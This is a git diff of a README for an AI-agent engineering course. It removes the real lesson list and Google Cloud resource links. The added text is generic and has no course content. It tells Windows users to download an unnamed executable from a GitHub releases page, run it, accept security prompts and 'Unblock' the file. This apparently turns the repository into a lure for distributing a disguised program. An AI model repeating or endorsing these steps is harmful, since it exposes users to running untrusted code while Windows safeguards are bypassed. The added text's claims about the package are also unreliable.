@@ -1,90 +1,176 @@
-# Agent Engineer - a course for software engineers
+# 🤖 agent-engineer - Learn practical AI agent skills
 
-Learn the fundamentals of AI agents and how to build them with Google Cloud AI.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/thiennha1147/agent-engineer/releases)
 
-## Who is this for?
+## 📘 What this is
 
-Software engineers who want to understand what AI agents are, how they work, and how to build them. No prior AI/ML experience required - just curiosity and some Python knowledge.
+agent-engineer is a practical course for software engineers who want to learn how AI agents work. It helps you move from simple AI use to building agent-based workflows.
 
-## Course overview
+This course is built for Windows users who want a clear path to get started. You can use it to study core ideas, follow guided lessons, and try hands-on examples that focus on agentic systems, AI agents, and generative AI.
 
-This course is split into three parts:
+## 🖥️ What you need
 
-**Part 1: Fundamentals (101)** - Understand the core concepts behind AI agents. These lessons are platform-agnostic and focused on building your mental model.
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Enough free space to store the course files
+- A modern web browser such as Chrome, Edge, or Firefox
+- Basic comfort with opening files and folders
 
-**Part 2: Building and shipping (201)** - Put those fundamentals into practice using Google Cloud AI, Vertex AI, and the Agent Development Kit (ADK).
+## 🚀 Download the course
 
-**Part 3: Deep dives (301)** - Go deeper on specific topics that matter for real-world agent development.
+Visit the releases page here:
 
-## Lessons
+[Download agent-engineer from GitHub Releases](https://github.com/thiennha1147/agent-engineer/releases)
 
-### Part 1: fundamentals
+On that page, look for the latest release and download the file listed for Windows. If there are several files, choose the one meant for Windows or the main package file.
 
-| # | Lesson | What you will learn |
-|---|--------|-------------------|
-| 01 | [What are AI agents?](./01-what-are-ai-agents/README.md) | The big picture - what agents are, why they matter, and when to use them |
-| 02 | [How agents think](./02-how-agents-think/README.md) | LLMs as the reasoning engine - how models plan, decide, and generate |
-| 03 | [Tools - giving agents hands](./03-tools-giving-agents-hands/README.md) | Function calling, tool design, and connecting agents to the real world |
-| 04 | [Agentic design patterns](./04-agentic-design-patterns/README.md) | ReAct, reflection, planning, and other core patterns |
-| 05 | [Memory and context](./05-memory-and-context/README.md) | How agents remember things - sessions, context windows, and long-term memory |
-| 06 | [Planning and reasoning](./06-planning-and-reasoning/README.md) | How agents break down complex tasks and make decisions |
-| 07 | [Multi-agent systems](./07-multi-agent-systems/README.md) | When one agent is not enough - coordination, delegation, and teamwork |
-| 08 | [Agentic RAG](./08-agentic-rag/README.md) | Going beyond basic retrieval - agents that search, evaluate, and refine |
-| 09 | [Evaluating and testing agents](./09-evaluating-and-testing-agents/README.md) | How to know if your agent actually works - metrics, evals, and observability |
-| 10 | [Guardrails and safety](./10-guardrails-and-safety/README.md) | Keeping agents trustworthy - security, alignment, and responsible AI |
+## 🛠️ Install and run on Windows
 
-### Part 2: building and shipping
+1. Open the downloads folder in your browser or in File Explorer.
+2. Find the file you downloaded from the releases page.
+3. If the file is a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main app file, setup file, or course launcher file.
+6. Double-click that file to start the course.
+7. If Windows asks for permission, select Yes or Run.
+8. Follow the on-screen steps until the course opens.
 
-| # | Lesson | What you will learn |
-|---|--------|-------------------|
-| 11 | [From prototype to production](./11-from-prototype-to-production/README.md) | The journey from demo to deployed - CI/CD, rollout, and operations |
-| 12 | [Getting started with Vertex AI and ADK](./12-getting-started-with-vertex-and-adk/README.md) | The Google Cloud AI stack for agents - what is available and how it fits together |
-| 13 | [Building your first agent](./13-building-your-first-agent/README.md) | Hands-on - build a working agent with ADK step by step |
-| 14 | [Agent protocols - MCP and A2A](./14-agent-protocols-mcp-and-a2a/README.md) | How agents talk to tools and to each other using open standards |
+## 📂 If you downloaded a ZIP file
 
-### Part 3: deep dives
+Some releases come as a ZIP file. This is normal.
 
-| # | Lesson | What you will learn |
-|---|--------|-------------------|
-| 15 | [AGENTS.md](./15-agents-md/README.md) | Giving AI coding agents context about your project with a standard config file |
-| 16 | [MCP deep dive](./16-mcp-deep-dive/README.md) | How MCP works under the hood, MCP vs. CLI tools, and security considerations |
-| 17 | [Agent skills](./17-agent-skills/README.md) | Packaging reusable domain expertise as portable skill modules |
-| 18 | [Orchestrators](./18-orchestrators/README.md) | Managing agent control flow - patterns, frameworks, and best practices |
-| 19 | [Where to go from here](./19-where-to-go-from-here/README.md) | Resources, codelabs, community, and next steps |
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Choose a folder you can find easily, like Downloads or Desktop.
+4. Open the new folder after extraction.
+5. Start the main file from inside that folder.
 
-## How to use this course
+## 🔎 How to use the course
 
-- **Read in order** if you are new to agents. Each lesson builds on the previous one.
-- **Jump around** if you already know the basics. Each lesson is self-contained enough to read on its own.
-- **Follow the links** to official docs, codelabs, and tutorials for hands-on practice. We intentionally link out to maintained resources rather than duplicating API docs or code samples that go stale.
+- Open the course from the main file or launcher
+- Follow the lessons in order
+- Read each section before moving on
+- Use the examples as you go
+- Try the exercises after each lesson
+- Keep notes on prompts, patterns, and agent steps
 
-## Philosophy
+## 🧭 What you will learn
 
-This course follows a few principles:
+This course focuses on practical work with AI agents. You can expect topics like:
 
-- **Analogies first.** We use everyday comparisons to explain complex concepts before diving into technical details.
-- **Fundamentals over frameworks.** Understand the "why" before the "how." Frameworks change, but the core ideas stick around.
-- **Link, don't duplicate.** For API references, code samples, and setup instructions, we point to official Google Cloud docs and codelabs. This keeps our content focused on concepts and ensures you always see up-to-date information.
-- **Honest about trade-offs.** Every architectural choice has costs. We try to show both sides.
+- How agentic systems think through tasks
+- How to split a large task into smaller steps
+- How to guide an AI agent with clear instructions
+- How to use generative AI in software work
+- How to build simple workflow loops
+- How to review and improve agent output
+- How to think about safety, limits, and control
 
-## Prerequisites
+## 🧰 Typical course features
 
-- Basic Python knowledge (functions, classes, HTTP requests)
-- A Google Cloud account ([free trial available](https://cloud.google.com/free))
-- Familiarity with REST APIs and JSON
+The course package may include:
 
-## Additional resources
+- Guided lessons
+- Hands-on examples
+- Step-by-step exercises
+- Sample prompts
+- Short reference notes
+- Practice tasks for real use cases
+- A simple layout for easy reading
 
-- [Google Cloud AI documentation](https://cloud.google.com/ai)
-- [Vertex AI documentation](https://cloud.google.com/vertex-ai/docs)
-- [Agent Development Kit (ADK) documentation](https://google.github.io/adk-docs/)
-- [Google Cloud AI codelabs](https://codelabs.developers.google.com/?cat=AI)
-- [Gemini API documentation](https://ai.google.dev/docs)
+## 🧪 First run checks
 
-## Contributing
+After you open the course, check these items:
 
-Found a typo? Have a suggestion? PRs and issues are welcome. See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+- The main screen loads without errors
+- Text and images display clearly
+- Buttons or lesson links work
+- You can move between sections
+- Files open when you click them
+- The course remembers your place if you close it
 
-## License
+If something does not open, close the app and start it again from the extracted folder.
 
-This project is licensed under the Apache 2.0 License - see the [LICENSE](./LICENSE) file for details.
+## 🧼 Common Windows issues
+
+### File will not open
+
+- Make sure you extracted the ZIP file first
+- Check that you opened the correct file
+- Right-click the file and choose Open if double-click does not work
+
+### Windows shows a security prompt
+
+- Choose Yes or Run if you trust the file from the releases page
+- Use the file from the official GitHub release only
+
+### The file looks blocked
+
+- Right-click the file
+- Select Properties
+- If you see an Unblock option, turn it on
+- Click Apply and try again
+
+### The course starts but shows a blank screen
+
+- Close the app
+- Open it again
+- Make sure no other copy is already running
+- Try extracting the ZIP file to a shorter folder path like Desktop
+
+## 🗂️ Suggested folder setup
+
+Keep the files in a simple folder so they are easy to find.
+
+Example:
+
+- Downloads
+  - agent-engineer
+    - app or course files
+
+A clean folder path helps when you need to open the app again later.
+
+## 📚 Who this course is for
+
+This course is a good fit if you are:
+
+- A software engineer who wants to learn about AI agents
+- A beginner who wants a simple path into agentic frameworks
+- Someone who wants to understand generative AI in a practical way
+- A learner who prefers guided examples over theory
+- A Windows user who wants a direct install and run process
+
+## 🧠 Learning approach
+
+The course is set up to help you learn by doing. That means:
+
+- You read a short lesson
+- You see a clear example
+- You follow a task
+- You check the result
+- You repeat the pattern with new ideas
+
+This approach works well for agent engineering because many ideas become clear only after you use them in a real workflow.
+
+## 🛡️ Safe use
+
+- Download only from the GitHub releases page
+- Keep the files in a folder you can review later
+- Do not rename files unless the course tells you to
+- Do not move files while the app is open
+- If Windows blocks the file, check that you downloaded the release from the correct page
+
+## 🔗 Download again if needed
+
+If you need the file later, use the releases page here:
+
+[https://github.com/thiennha1147/agent-engineer/releases](https://github.com/thiennha1147/agent-engineer/releases)
+
+## 📌 Quick steps
+
+1. Open the releases page
+2. Download the Windows file from the latest release
+3. Extract the ZIP file if needed
+4. Open the extracted folder
+5. Double-click the main file
+6. Follow the course on screen
